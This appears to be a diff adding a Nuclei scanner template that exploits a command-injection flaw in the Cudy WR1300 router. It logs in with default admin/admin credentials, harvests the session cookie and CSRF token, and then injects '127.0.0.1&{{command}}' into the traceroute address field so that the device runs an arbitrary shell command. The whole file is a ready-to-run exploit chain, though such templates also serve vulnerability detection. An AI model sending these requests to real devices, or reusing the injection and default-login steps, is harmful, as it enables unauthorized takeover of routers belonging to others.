@@ -1,0 +1,83 @@
+id: wr1300-traceroute-command-exec
+info:
+  name: WR1300 Traceroute Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The WR1300 device by Shenzhen Cudy Technology Co., Ltd. has a command execution vulnerability that allows attackers to execute arbitrary commands on the server, potentially gaining full control over the device.
+  reference:
+    - https://fofa.info
+  tags: command-execution
+variables:
+  command: "id"
+http:
+  - raw:
+      - |
+        POST /cgi-bin/luci HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        timeclock=1668525846&luci_language=auto&luci_username=admin&luci_password=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Location: /cgi-bin/luci/"
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: sysauth="
+    extractors:
+      - type: regex
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - "Set-Cookie: sysauth=(.*?); path=/cgi-bin/luci/"
+
+  - raw:
+      - |
+        GET /cgi-bin/luci/admin/network/traceroute?nomodal= HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sysauth={{sysauth}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "form-horizontal"
+          - "name=\"token\""
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "name=\"token\" value=\"(.*?)\""
+
+  - raw:
+      - |
+        POST /cgi-bin/luci/admin/network/traceroute?nomodal= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWa81b2HLyaCj14LA
+        Cookie: sysauth={{sysauth}}
+
+        ------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="token"\r\n\r\n{{token}}\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="timeclock"\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="cbi.submit"\r\n\r\n1\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="cbid.traceroute.1.addr"\r\n\r\n127.0.0.1&{{command}}\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="cbid.traceroute.1.refresh"\r\n\r\nTRACEROUTE\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name="cbid.traceroute.1._custom"\r\n\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "name=\"token\""
+          - "traceroute to"
